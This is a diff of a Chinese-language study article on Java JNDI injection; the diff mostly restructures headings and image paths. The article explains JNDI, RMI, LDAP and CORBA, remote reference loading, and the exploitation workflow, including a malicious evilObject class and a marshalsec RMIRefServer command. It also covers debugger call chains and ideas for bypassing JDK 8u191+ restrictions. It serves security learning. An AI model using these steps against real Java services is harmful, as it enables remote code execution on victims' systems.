@@ -1,11 +1,12 @@
 # Java安全学习-JNDI注入
-作者: H3rmesk1t@D1no
 
-## JNDI
-### 简介
+Author: H3rmesk1t
+
+# JNDI
+## 简介
 `JNDI`(Java Naming Directory Interface)是`Java`提供的一个访问命令和目录服务的`API`, 命名服务将名称和对象联系起来, 使得可以从名称访问对象, [官方链接](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html).
 
-![JNDI](./Java安全学习-JNDI注入/1.gif)
+![JNDI](./images/1.gif)
 
 `JNDI`包含在`Java SE`平台中, 要使用`JNDI`时, 必须要拥有`JNDI`类和一个或多个服务提供者, `JDK`包括以下命名或者目录服务的服务提供者:
  - DNS: Domain Name Service (域名服务)
@@ -20,9 +21,9 @@
  - javax.naming.event
  - javax.naming.directory
 
-![javax.naming](./Java安全学习-JNDI注入/1.png)
+![javax.naming](./images/1.png)
 
-### 示例代码
+## 示例代码
 这里通过实现一个简单的例子来更好的理解`JNDI`.
 
  - Demo.java
@@ -104,15 +105,15 @@ public class CallService {
 }
 ```
 
-![JNDI-Demo](./Java安全学习-JNDI注入/2.png)
+![JNDI-Demo](./images/2.png)
 
-## SPI
+# SPI
 在`JDK`中内置了几个`Service Provider`, 分别是`RMI`、`LDAP`和`CORBA`. 但是这几个服务本身和`JNDI`没有直接的依赖, 而是通过`SPI`接口实现了联系.
 
-### RMI
+## RMI
 `RMI`(Remote Method Invocation), 即`Java`远程方法调用, 为应用提供了远程调用的接口, 一个简单的`RMI`主要由三部分组成, 分别是接口、服务端和客户端. 具体详见之间分析的[Java安全——RMI学习](https://github.com/H3rmesk1t/Learning_summary/blob/main/2022-1-19/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-RMI%E5%AD%A6%E4%B9%A0.md).
 
-### LDAP
+## LDAP
 `LDAP`(Lightweight Directory Access Protocol), 即轻量级目录访问协议. 它提供了一种查询、浏览、搜索和修改互联网目录数据的机制, 运行在`TCP/IP`协议栈上, 基于`C/S`架构.
 
 `Java`对象在`LDAP`目录中也有多种存储形式:
@@ -141,10 +142,10 @@ UID     userid
  - `DC`: `Domain Component`, 组成域名的部分, 比如域名`evilpan.com`的一条记录可以表示为`dc=evilpan,dc=com`, 从右至左逐级定义.
  - `DN`: `Distinguished Name`, 由一系列属性(从右至左)逐级定义的, 表示指定对象的唯一名称.
 
-### CORBA
+## CORBA
 `CORBA`是一个由`Object Management Group`(OMG)定义的标准. 在分布式计算的概念中, `Object Request Broker`(ORB))表示用于分布式环境中远程调用的中间件. 其实就是早期的一个`RPC`标准, `ORB`在客户端负责接管调用并请求服务端, 在服务端负责接收请求并将结果返回. `CORBA`使用接口定义语言(IDL)去表述对象的对外接口, 编译生成的`stub code`支持`Ada`、`C/C++`、`Java`、`COBOL`等多种语言. 其调用架构如下图所示:
 
-![CORBA](./Java安全学习-JNDI注入/3.png)
+![CORBA](./images/3.png)
 
 一个简单的`CORBA`用户程序由三部分组成，分别是`IDL`、客户端和服务端:
  - IDL
@@ -276,7 +277,7 @@ public class HelloClient
 }
 ```
 
-## 动态协议转换
+# 动态协议转换
 在上文的示例代码中都手动设置了对应服务的工厂以及对应服务的`PROVIDER_URL`, 其实在`JNDI`中是可以进行动态协议转换的, 示例代码如下:
 
  - Demo-1
@@ -302,9 +303,9 @@ context.lookup(name);
 
 从源码层面上来看看具体的流程, 跟进`InitialContext#lookup`方法, 在返回值中会调用`InitialContext#getURLOrDefaultInitCtx`方法, 继续跟进该方法, 在这里会进行动态转化操作.
 
-![InitialContext#lookup](./Java安全学习-JNDI注入/4.png)
+![InitialContext#lookup](./images/4.png)
 
-![InitialContext#getURLOrDefaultInitCtx](./Java安全学习-JNDI注入/5.png)
+![InitialContext#getURLOrDefaultInitCtx](./images/5.png)
 
 `JDK`中默认支持的`JNDI`自动协议转换以及对应的工厂类如下:
 |协议|schema|Context|
@@ -317,7 +318,7 @@ context.lookup(name);
 |IIOP|iiopname://|com.sun.jndi.url.iiopname.iiopnameURLContext|
 |IIOP|corbaname://|com.sun.jndi.url.corbaname.corbanameURLContext|
 
-## 命名引用
+# 命名引用
 `JNDI`定义了命名引用(Naming References), 简称引用(References). 其大致过程就是通过绑定一个引用, 将对象存储到命名服务或目录服务中, 命名管理器(Naming Manager)可以将引用解析为关联的原始对象. 引用由`Reference`类来表示, 它由地址(RefAddress)的有序列表和所引用对象的信息组成. 而每个地址包含了如何构造对应的对象的信息, 包括引用对象的`Java`类名, 以及用于创建对象的`object factory`类的名称和位置. `Reference`可以使用工厂来构造对象, 当使用`lookup`查找对象时, `Reference`将使用提供的工厂类加载地址来加载工厂类, 工厂类将构造出需要的对象, 可以从远程加载地址来加载工厂类. 示例代码如下:
 
 ```java
@@ -330,7 +331,7 @@ ctx.bind("refObj", wrapper);
 
 对于`JNDI`的攻击, 其攻击过程可以归纳为下图内容:
 
-![JNDI攻击图](./Java安全学习-JNDI注入/6.png)
+![JNDI攻击图](./images/6.png)
 
  - ①: 攻击者为易受攻击的`JNDI`的`lookup`方法提供了`LDAP/RMI URL`.
  - ②: 目标服务器连接到远端`LDAP/RMI`服务器, `LDAP/RMI`服务器返回恶意`JNDI`引用.
@@ -344,10 +345,10 @@ ctx.bind("refObj", wrapper);
  - JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为 false
  - JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为 false
 
-![JNDI限制](./Java安全学习-JNDI注入/7.jpeg)
+![JNDI限制](./images/7.jpeg)
 
-## 漏洞利用
-### RMI
+# 漏洞利用
+## RMI
 通过`RMI`进行`JNDI`注入的步骤大致为:
  - 攻击者构造恶意对象, 在其构造方法中加入恶意代码, 上传至服务器中等待远程加载.
  - 构造恶意 RMI 服务器, bind 一个 ReferenceWrapper 对象, ReferenceWrapper 对象是一个 Reference 对象的封装.
@@ -367,7 +368,7 @@ public Reference(String className, String factory, String factoryLocation) {
 }
 ```
 
-#### 示例代码
+### 示例代码
 
  - JNDIClient.java
 
@@ -446,7 +447,7 @@ public class evilObject {
 }
 ```
 
-![JNDI-RMI](./Java安全学习-JNDI注入/8.png)
+![JNDI-RMI](./images/8.png)
 
 运行步骤:
  - 编译恶意类文件: `javac evilObject`
@@ -465,32 +466,32 @@ public class evilObject {
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:80/#testObject 7777
 ```
 
-#### 过程分析
+### 过程分析
 在`JNDIClient.java`文件中的`GenericURLContext#lookup`方法处下断点.
 
-![JNDIClient-lookup](./Java安全学习-JNDI注入/9.png)
+![JNDIClient-lookup](./images/9.png)
 
 跟进`GenericURLContext#lookup`方法, 会进一步调用`RegistryContext#lookup`方法.
 
-![GenericURLContext#lookup](./Java安全学习-JNDI注入/10.png)
+![GenericURLContext#lookup](./images/10.png)
 
 跟进`RegistryContext#lookup`方法, 这里通过调用`this.registry.lookup`获取到了`ReferenceWrapper_Stub`对象, 并与`reference`一起传入了`this.decodeObject`方法.
 
-![RegistryContext#lookup](./Java安全学习-JNDI注入/11.png)
+![RegistryContext#lookup](./images/11.png)
 
 跟进`RegistryContext#decodeObject`方法, 检测`var1`是否是`RemoteReference`的实例, 是的话则通过`getReference`方法获取`Reference`对象.
 
-![RegistryContext#decodeObject](./Java安全学习-JNDI注入/12.png)
+![RegistryContext#decodeObject](./images/12.png)
 
 继续跟进`NamingManager#getObjectInstance`, 调用`getObjectFactoryFromReference`方法, 如果本地存在需要获取的类, 则会使用在本地直接获取; 如果本地不存在并且可以从远程获取到该类, 则会远程加载类. 获取到类之后, 会在`return`返回语句中调用`newInstance`方法, 会触发类的构造方法. 由于我们把恶意语句写在了构造方法处, 因此在这里会被触发执行.
 
-![NamingManager#getObjectInstance](./Java安全学习-JNDI注入/13.png)
+![NamingManager#getObjectInstance](./images/13.png)
 
-![NamingManager#getObjectFactoryFromReference](./Java安全学习-JNDI注入/14.png)
+![NamingManager#getObjectFactoryFromReference](./images/14.png)
 
-![效果图](./Java安全学习-JNDI注入/15.png)
+![效果图](./images/15.png)
 
-#### 调用链
+### 调用链
 
 ```java
 getObjectFactoryFromReference(Reference, String):163, NamingManager (javax.naming.spi), NamingManager.java
@@ -502,12 +503,12 @@ lookup(String):417, InitialContext (javax.naming), InitialContext.java
 main(String[]):17, JNDIClient (jndi_test1), JNDIClient.java
 ```
 
-![调用链](./Java安全学习-JNDI注入/16.png)
+![调用链](./images/16.png)
 
-### LDAP
+## LDAP
 `LDAP`服务只是把协议名改成`ldap`即可, 分析过程和`RMI`类似.
 
-#### 示例代码
+### 示例代码
  - JNDIClient
 
 ```java
@@ -529,28 +530,28 @@ public class JNDIClient {
 }
 ```
 
-![JNDI-LDAP](./Java安全学习-JNDI注入/17.png)
+![JNDI-LDAP](./images/17.png)
 
-#### 过程分析
+### 过程分析
 这里利用`marshalsec`起一个`LDAP`服务, 同样将断点下在`lookup`处. 之前的步骤和`RMI`一样, 这里直接分析后面不同的地方.
 
 跟进`GenericURLContext#lookup`方法, 进一步调用`PartialCompositeContext#lookup`方法, 在`for`循环的条件中先调用`ComponentContext#p_lookup`方法.
 
-![GenericURLContext#lookup](./Java安全学习-JNDI注入/18.png)
+![GenericURLContext#lookup](./images/18.png)
 
 跟进`ComponentContext#p_lookup`方法, 由于`var4.getStatus()`的值为`2`, 因此进一步调用`LdapCtx#c_lookup`方法.
 
-![ComponentContext#p_lookup](./Java安全学习-JNDI注入/19.png)
+![ComponentContext#p_lookup](./images/19.png)
 
 跟进`LdapCtx#c_lookup`方法, 和之前分析`RMI`的过程一样, 跟进`Obj#decodeObject`方法, 在该方法中存在几种序列化数据的处理, 详细可见安全客上的这篇文章[JNDI with LDAP](https://www.anquanke.com/post/id/201181).
 
-![LdapCtx#c_lookup](./Java安全学习-JNDI注入/20.png)
+![LdapCtx#c_lookup](./images/20.png)
 
 回到上一步, 跟进`DirectoryManager#getObjectInstance`方法, 再调用`getObjectFactoryFromReference`方法, 之后和`RMI`中一样的操作了, 判断本地是否存在需要获取的类, 不存在则远程加载, 在`return`返回语句中调用`newInstance`方法, 会触发类的构造方法, 从而来执行`exploit`.
 
-![DirectoryManager#getObjectInstance](./Java安全学习-JNDI注入/21.png)
+![DirectoryManager#getObjectInstance](./images/21.png)
 
-#### 调用链
+### 调用链
 
 ```java
 getObjectFactoryFromReference(Reference, String):142, NamingManager (javax.naming.spi), NamingManager.java
@@ -564,12 +565,12 @@ lookup(String):417, InitialContext (javax.naming), InitialContext.java
 main(String[]):14, JNDIClient (jndi_test1), JNDIClient.java
 ```
 
-![LDAP调用链](./Java安全学习-JNDI注入/22.png)
+![LDAP调用链](./images/22.png)
 
-## 绕过JDK 8u191+等高版本限制
+# 绕过JDK 8u191+等高版本限制
 自[jdk8u191-b02](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33)版本后, 新添加了`com.sun.jndi.ldap.object.trustURLCodebase`默认为`false`的限制, 在`decodeObject`方法处新增了一个读`trustURLCodebase`的判断, 而这个值默认是为`false`的, 因此无法通过`RMI`、`LDAP`加载远程的`Reference`工厂类.
 
-![trustURLCodebase](./Java安全学习-JNDI注入/23.png)
+![trustURLCodebase](./images/23.png)
 
 两种绕过方法如下：
  - 找到一个受害者本地`CLASSPATH`中的类作为恶意的`Reference Factory`工厂类, 并利用这个本地的`Factory`类执行命令.
@@ -577,7 +578,7 @@ main(String[]):14, JNDIClient (jndi_test1), JNDIClient.java
 
 这两种方式都依赖受害者本地`CLASSPATH`中环境, 需要利用受害者本地的`Gadget`进行攻击.
 
-## 参考
+# 参考
  - [JAVA JNDI注入知识详解](https://www.anquanke.com/post/id/205447)
  - [JNDI 注入漏洞的前世今生](https://evilpan.com/2021/12/13/jndi-injection/)
  - [Lesson: Overview of JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)
